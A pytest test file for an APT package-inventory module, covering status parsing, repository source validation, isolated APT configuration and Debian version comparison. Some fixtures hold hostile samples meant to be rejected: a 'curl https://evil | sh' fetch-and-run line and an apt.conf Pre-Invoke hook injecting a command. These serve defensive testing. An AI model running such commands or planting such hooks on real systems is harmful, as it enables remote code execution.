import base64
import subprocess
from pathlib import Path
import pytest
from app import apt
STATUS='Package: bash\nStatus: install ok installed\nArchitecture: arm64\nVersion: 1:5.2-1\n\nPackage: old\nStatus: deinstall ok config-files\nArchitecture: arm64\nVersion: 1\n\nPackage: hold\nStatus: hold ok installed\nArchitecture: arm64\nVersion: 2\n'

def test_inventory_preserves_holds_and_architecture():
    result=apt.installed(STATUS)
    assert len(result)==2 and result[1]['held']
    assert result[0]['name']=='bash:arm64'

@pytest.mark.parametrize('content,deb822',[
 ('deb [trusted=yes] https://example.com stable main',False),
 ('Types: deb\nURIs: file:/tmp\nSuites: stable',True),
 ('Types: deb\nURIs: https://example.com\nSuites: stable\nCheck-Valid-Until: no',True),
 ('deb https://user:secret@example.com stable main',False),
 ('curl https://evil | sh',False),
])
def test_unsafe_repositories_fail_closed(content,deb822):
    with pytest.raises(ValueError): apt.validate_source(content,deb822)

def test_deb822_and_inline_key_supported():
    s='Types: deb\nURIs: https://archive.ubuntu.com/ubuntu\nSuites: noble noble-updates\nComponents: main universe\nSigned-By:\n -----BEGIN PGP PUBLIC KEY BLOCK-----\n .\n abc\n -----END PGP PUBLIC KEY BLOCK-----\n'
    assert apt.validate_source(s,True)==s

def test_apt_isolated_state_and_signed_by_remap(tmp_path,monkeypatch):
    monkeypatch.setattr(apt,'DATA',tmp_path)
    inv={'status':STATUS,'architecture':'arm64','foreign_architectures':['armhf'],'machine_id':'test','keys':{'/usr/share/keyrings/test.gpg':base64.b64encode(b'key').decode()},'files':{'/etc/apt/sources.list':'deb [signed-by=/usr/share/keyrings/test.gpg] https://example.com stable main','/etc/apt/apt.conf':'APT::Update::Pre-Invoke { "touch /tmp/evil"; };'}}
    root,cfg=apt.prepare('host',inv)
    assert str(root)+'/usr/share/keyrings/test.gpg' in (root/'etc/apt/sources.list').read_text()
    assert not (root/'etc/apt/apt.conf').exists()
    assert 'armhf' in cfg.read_text()
    # Check actual APT config paths; no network and no target apt queries.
    out=apt.run(cfg,['apt-config','dump'])
    assert f'Dir::State::status "{root}/var/lib/dpkg/status"' in out
    assert 'touch /tmp/evil' not in out

def test_native_debian_version_comparison():
    assert subprocess.run(['dpkg','--compare-versions','1:1.0','gt','9.9']).returncode==0
    assert subprocess.run(['dpkg','--compare-versions','1.0~rc1','lt','1.0']).returncode==0

def test_policy_parser_multiarch():
    r=apt.parse_policy('bash:arm64:\n  Installed: 1\n  Candidate: 2\n  Version table:\n     2 500\n        500 https://example.com noble-security/main arm64 Packages\n')
    assert r['bash:arm64']['candidate']=='2'
    assert 'noble-security' in r['bash:arm64']['origin']


def test_refresh_reuses_comparisons_and_preserves_candidate_policy(tmp_path,monkeypatch):
    from app import debian_versions, packages
    from types import SimpleNamespace
    rows=[('same','1','1'),('upgrade','1','2'),('held','1','2'),
          ('older','3','2'),('missing','1','(none)'),('unknown','1','')]
    status='\n\n'.join(f'Package: {name}\nStatus: {"hold" if name=="held" else "install"} ok installed\nArchitecture: arm64\nVersion: {old}' for name,old,new in rows)
    policy=''.join(f'{name}:arm64:\n  Candidate: {new}\n  Version table:\n     {new} 500\n        500 https://example.com noble-security/main arm64 Packages\n' for name,old,new in rows)
    monkeypatch.setattr(apt,'prepare',lambda *args:(tmp_path,tmp_path/'apt.conf'))
    monkeypatch.setattr(apt,'run',lambda cfg,args: 'updated' if args[0]=='apt-get' else policy)
    calls=[]
    def native(args,**kwargs):
        calls.append(args)
        return SimpleNamespace(returncode=0 if args[2:]==['2','gt','1'] else 1)
    monkeypatch.setattr(debian_versions.subprocess,'run',native)
    result,log=apt.refresh('host',{'status':status})
    assert len(calls)==2
    assert [p['candidate'] for p in result]==['','2','2','','','']
    assert result[2]['held'] and result[2]['priority']=='high'
    assert result[0]['name']=='same:arm64' and log=='updated'
    calls.clear()
    assert packages.newer_flags({},[('1','1'),('2','1'),('2','1')])==[False,True,True]
    assert len(calls)==1


def test_native_inventory_comparison_benchmark(capsys,monkeypatch):
    import time
    from app import debian_versions
    native=subprocess.run
    for label,pairs in [('unchanged',[('1.0-1','1.0-1')]*1000),
                        ('mixed',[('2:1.0-2','1.0'),('1.0~rc1','1.0'),('1','1')]*334)]:
        start=time.perf_counter()
        baseline=[native(['/usr/bin/dpkg','--compare-versions',a,'gt',b]).returncode==0 for a,b in pairs]
        before=time.perf_counter()-start
        calls=[]
        def counted(*args,**kwargs):
            calls.append(args)
            return native(*args,**kwargs)
        with monkeypatch.context() as patch:
            patch.setattr(debian_versions.subprocess,'run',counted)
            start=time.perf_counter();actual=debian_versions.newer_flags(pairs);after=time.perf_counter()-start
        assert actual==baseline
        assert len(calls)==(0 if label=='unchanged' else 2)
        with capsys.disabled():
            print(f'\nDebian {label} inventory: baseline {len(pairs)} processes/{before:.4f}s; optimized {len(calls)} processes/{after:.4f}s')
